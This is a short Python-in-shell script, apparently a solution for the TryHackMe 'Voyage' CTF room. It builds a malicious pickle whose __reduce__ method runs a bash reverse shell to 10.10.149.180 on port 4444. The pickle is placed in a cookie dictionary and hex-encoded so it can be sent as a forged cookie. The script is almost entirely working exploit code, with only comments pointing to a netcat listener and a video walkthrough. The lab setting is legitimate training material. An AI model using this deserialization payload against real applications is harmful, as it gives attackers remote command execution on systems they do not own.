# for tryhackme room Voyage https://tryhackme.com/room/voyage
# run below on terminal
# Youtube video walk through: https://youtu.be/vB2KG0V-oc0

python3 - <<'PY'
import pickle, binascii, os

class ReverseShell:
    def __reduce__(self):
        # Set up listener first: nc -lvnp 4444
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.149.180/4444 0>&1"'
        return os.system, (cmd,)

cookie = {'user': ReverseShell(), 'revenue': '999999'}
raw = pickle.dumps(cookie, protocol=4)
print(binascii.hexlify(raw).decode())
PY
